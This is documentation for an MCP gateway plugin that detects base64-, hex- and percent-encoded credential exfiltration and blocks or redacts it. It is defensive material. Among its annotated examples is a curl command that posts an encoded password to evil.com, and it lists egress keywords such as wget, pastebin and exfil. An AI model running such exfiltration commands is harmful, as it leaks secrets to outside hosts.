# Encoded Exfil Detector Plugin

> Author: Mihai Criveti | Hardened by: Pratik Gandhi

Detects suspicious encoded payload exfiltration patterns in prompt arguments, tool outputs, and resource content. Blocks or redacts detected payloads based on a multi-factor suspicion scoring system.

## Overview

In an MCP gateway, an attacker could encode sensitive data (credentials, API keys, private keys) using base64, hex, or percent-encoding to bypass plaintext content filters. This plugin decodes candidate segments, scores them on multiple suspicion indicators, and blocks or redacts payloads that exceed the configured threshold.

Uses Rust acceleration automatically when the `encoded_exfil_detection_rust` wheel is installed, otherwise falls back to a pure Python implementation with identical behavior.

## Hooks

| Hook | Purpose |
|------|---------|
| `prompt_pre_fetch` | Scan prompt arguments before execution |
| `tool_post_invoke` | Scan tool outputs after execution |
| `resource_post_fetch` | Scan fetched resource content |

## Detection Types

| Encoding | Pattern | Min Chars | Example |
|----------|---------|-----------|---------|
| Base64 | `[A-Za-z0-9+/]{16,}={0,2}` | 16 | `cGFzc3dvcmQ9c2VjcmV0` |
| Base64URL | `[A-Za-z0-9_-]{16,}={0,2}` | 16 | `cGFzc3dvcmQ9c2VjcmV0` |
| Hex | `[A-Fa-f0-9]{24,}` | 24 | `70617373776f72643d736563726574` |
| Percent-encoding | `(?:%[0-9A-Fa-f]{2}){8,}` | 8 sequences | `%70%61%73%73%77%6f%72%64` |
| Escaped hex | `(?:\\x[0-9A-Fa-f]{2}){8,}` | 8 sequences | `\x70\x61\x73\x73\x77\x6f\x72\x64` |

### Nested Encoding

The plugin peels multiple encoding layers (e.g., `base64(hex(secret))`). The `max_decode_depth` parameter controls how many layers are decoded. At each layer, the decoded content is re-scanned for additional encoded segments.

## Scoring Mechanism

Each decoded candidate is scored against multiple suspicion indicators. Only candidates meeting or exceeding `min_suspicion_score` are reported.

| Indicator | Points | Condition |
|-----------|--------|-----------|
| Decodable | +1 | Candidate successfully decodes |
| High entropy | +1 | Shannon entropy >= `min_entropy` |
| Printable payload | +1 | Printable ASCII ratio >= `min_printable_ratio` |
| Sensitive keywords | +2 | Decoded content contains keywords like `password`, `token`, `api_key`, `bearer`, `ssh-rsa`, etc. |
| Egress context | +1 | Nearby text contains egress hints like `curl`, `webhook`, `upload`, `https://`, etc. |
| Long segment | +1 | Candidate length >= 2x `min_encoded_length` |

**Maximum possible score: 7**

### Built-in Sensitive Keywords

`password`, `passwd`, `secret`, `token`, `api_key`, `apikey`, `authorization`, `bearer`, `cookie`, `session`, `private key`, `ssh-rsa`, `refresh_token`, `client_secret`

### Built-in Egress Hints

`curl`, `wget`, `http://`, `https://`, `upload`, `webhook`, `beacon`, `dns`, `exfil`, `pastebin`, `socket`, `send`

Both lists can be extended via `extra_sensitive_keywords` and `extra_egress_hints` configuration.

## Configuration Reference

### Full Example

```yaml
- name: "EncodedExfilDetector"
  kind: "plugins.encoded_exfil_detection.encoded_exfil_detector.EncodedExfilDetectorPlugin"
  hooks: ["prompt_pre_fetch", "tool_post_invoke", "resource_post_fetch"]
  mode: "enforce"
  priority: 52
  config:
    # Per-encoding enable/disable
    enabled:
      base64: true
      base64url: true
      hex: true
      percent_encoding: true
      escaped_hex: true

    # Detection thresholds
    min_encoded_length: 24        # Min candidate length (8-8192)
    min_decoded_length: 12        # Min decoded bytes (4-32768)
    min_entropy: 3.3              # Shannon entropy threshold (0.0-8.0)
    min_printable_ratio: 0.70     # Printable ASCII ratio (0.0-1.0)
    min_suspicion_score: 3        # Score threshold to flag (1-10)

    # Safety limits
    max_scan_string_length: 200000  # Skip strings above this size (1K-5M)
    max_findings_per_value: 50      # Per-string finding cap (1-500)
    max_decode_depth: 2             # Nested encoding layers to peel (1-5)
    max_recursion_depth: 32         # Container nesting depth limit (1-1000)

    # Actions
    redact: false
    redaction_text: "***ENCODED_REDACTED***"
    block_on_detection: true
    min_findings_to_block: 1        # Findings required to block (1-1000)
    include_detection_details: true

    # Allowlisting (regex patterns to skip known-good encoded strings)
    allowlist_patterns: []
    #  - "eyJhbGciOiJSUzI1NiI.*"  # Known JWT prefix
    #  - "data:image/png;base64,.*"  # Image data URIs

    # Custom keywords and egress hints (merged with built-in defaults)
    extra_sensitive_keywords: []
    #  - "watsonx_api"
    #  - "ibm_cloud_key"
    extra_egress_hints: []
    #  - "s3_upload"
    #  - "mq_publish"

    # Logging
    log_detections: true
```

### Parameter Reference

| Parameter | Type | Default | Range | Description |
|-----------|------|---------|-------|-------------|
| `enabled` | dict[str, bool] | all true | — | Enable/disable each encoding type |
| `min_encoded_length` | int | 24 | 8-8192 | Minimum candidate segment length |
| `min_decoded_length` | int | 12 | 4-32768 | Minimum decoded byte length |
| `min_entropy` | float | 3.3 | 0.0-8.0 | Shannon entropy threshold |
| `min_printable_ratio` | float | 0.70 | 0.0-1.0 | Minimum printable ASCII ratio |
| `min_suspicion_score` | int | 3 | 1-10 | Score threshold to flag |
| `max_scan_string_length` | int | 200000 | 1K-5M | Skip strings above this size |
| `max_findings_per_value` | int | 50 | 1-500 | Per-string finding limit |
| `max_decode_depth` | int | 2 | 1-5 | Nested encoding layers to peel |
| `max_recursion_depth` | int | 32 | 1-1000 | Container nesting depth limit |
| `redact` | bool | false | — | Replace detected segments with `redaction_text` |
| `redaction_text` | str | `***ENCODED_REDACTED***` | — | Replacement text for redaction |
| `block_on_detection` | bool | true | — | Block request on findings |
| `min_findings_to_block` | int | 1 | 1-1000 | Number of findings required to block |
| `include_detection_details` | bool | true | — | Include full findings in metadata |
| `allowlist_patterns` | list[str] | [] | — | Regex patterns to skip (validated at init) |
| `extra_sensitive_keywords` | list[str] | [] | — | Additional sensitive keywords |
| `extra_egress_hints` | list[str] | [] | — | Additional egress context hints |
| `log_detections` | bool | true | — | Log detection events |

## Annotated Example Payloads

### Blocked: base64-encoded credential near egress context

```json
{"args": {"input": "curl -d 'cGFzc3dvcmQ9c3VwZXItc2VjcmV0LXRva2Vu' https://evil.com/collect"}}
```

**Score: 7** (decodable + high_entropy + printable_payload + sensitive_keywords + egress_context + long_segment)
- Decodes to: `password=super-secret-token`
- Contains keyword: `password`
- Egress context: `curl`, `https://`
- Result: **BLOCKED** with violation code `ENCODED_EXFIL_DETECTED`

### Allowed: normal text without encoded payloads

```json
{"args": {"input": "What is the weather in San Francisco?"}}
```

**Score: 0** — no encoded segments detected, passes through unmodified.

### Allowed: short base64 below threshold

```json
{"args": {"input": "The ID is YWJjZA=="}}
```

Not flagged — candidate `YWJjZA==` (8 chars) is below `min_encoded_length` (24).

### Redacted: hex-encoded payload with redaction enabled

Config: `redact: true`, `block_on_detection: false`

```json
{"result": {"data": "POST /collect data=70617373776f72643d7365637265742d76616c7565"}}
```

The hex segment decodes to `password=secret-value`. With redaction enabled, the output becomes:

```json
{"result": {"data": "POST /collect data=***ENCODED_REDACTED***"}}
```

## Tuning Guide

### Reducing False Positives

**Problem**: Legitimate base64 (JWTs, image data URIs, hashes) triggers detection.

**Solutions**:
1. **Allowlist known patterns**: Add regex patterns to `allowlist_patterns` for known-good encoded strings.
2. **Raise `min_suspicion_score`**: Default 3 catches most real attacks. Raising to 4-5 requires stronger signals (sensitive keywords + egress context).
3. **Raise `min_encoded_length`**: Default 24 is conservative. Raising to 32-48 skips shorter encoded strings.
4. **Disable specific encodings**: Set `enabled.hex: false` if hex strings are common in your workflow.

### Increasing Sensitivity

**Problem**: Encoded exfiltration attempts are not being caught.

**Solutions**:
1. **Lower `min_suspicion_score`**: Setting to 1-2 flags any decodable segment.
2. **Add custom keywords**: Use `extra_sensitive_keywords` for domain-specific secrets (e.g., `watsonx_api`, `ibm_cloud_key`).
3. **Add custom egress hints**: Use `extra_egress_hints` for domain-specific egress patterns (e.g., `s3_upload`, `mq_publish`).
4. **Increase `max_decode_depth`**: Default 2 peels two encoding layers. Raising to 3-5 catches deeper nesting.

### Tuning `min_entropy`

Shannon entropy measures randomness in the decoded payload:
- **0.0**: All identical bytes (e.g., `AAAA...`)
- **3.0-4.0**: English text, simple passwords
- **5.0-6.0**: Complex passwords, API keys
- **7.0-8.0**: Cryptographic keys, random bytes

Default **3.3** catches most real secrets while skipping trivial decoded content. Raise to 4.0+ for stricter filtering.

## Rust Acceleration

When the `mcpgateway-encoded-exfil-detection` wheel is installed (`uv pip install -e plugins_rust/encoded_exfil_detection/`), the plugin automatically uses the Rust implementation for scanning. The Rust path uses a persistent `ExfilDetectorEngine` that parses config once at init, pre-compiled static regexes, fixed-size arrays for entropy calculation, and optimized boundary validation.

If the Rust module fails to load (missing wheel, import error), the plugin silently falls back to the pure Python implementation. The `implementation` field in metadata indicates which path was used (`"Rust"` or `"Python"`).

Both implementations produce identical results for the same input (verified by parity tests).

## Behavior Summary

| Config | Behavior |
|--------|----------|
| `block_on_detection: true` | Returns violation code `ENCODED_EXFIL_DETECTED`, stops processing |
| `block_on_detection: false`, `redact: true` | Replaces detected segments with `redaction_text`, continues |
| `block_on_detection: false`, `redact: false` | Emits metadata with finding count and details, continues |

Metadata emitted on detection:
```json
{
  "encoded_exfil_count": 1,
  "encoded_exfil_findings": [{"encoding": "base64", "path": "args.input", "score": 5, ...}],
  "implementation": "Rust"
}
```

## Performance

When the Rust wheel is installed, the plugin is significantly faster. Benchmarks run via `plugins_rust/encoded_exfil_detection/compare_performance.py`:

| Scenario | Python | Rust | Speedup |
|----------|--------|------|---------|
| 1 base64 finding | 0.035ms | 0.007ms | **4.7x** |
| 5 mixed findings | 0.106ms | 0.018ms | **5.7x** |
| 20+ mixed findings | 0.662ms | 0.086ms | **7.7x** |
| ~50KB text, 2 findings | 1.432ms | 0.118ms | **12.1x** |
| Clean payload (no findings) | 0.014ms | 0.003ms | **4.3x** |

Rust speedup scales with payload size due to pre-compiled static regexes, fixed-size entropy arrays, and zero-copy string processing.

## Known Limitations

- **Cross-request correlation**: The plugin is stateless. Slow exfiltration split across multiple requests is not correlated.
- **Custom encoding patterns**: Only the 5 built-in encoding types are supported. User-defined regex patterns are not accepted to avoid ReDoS risk.
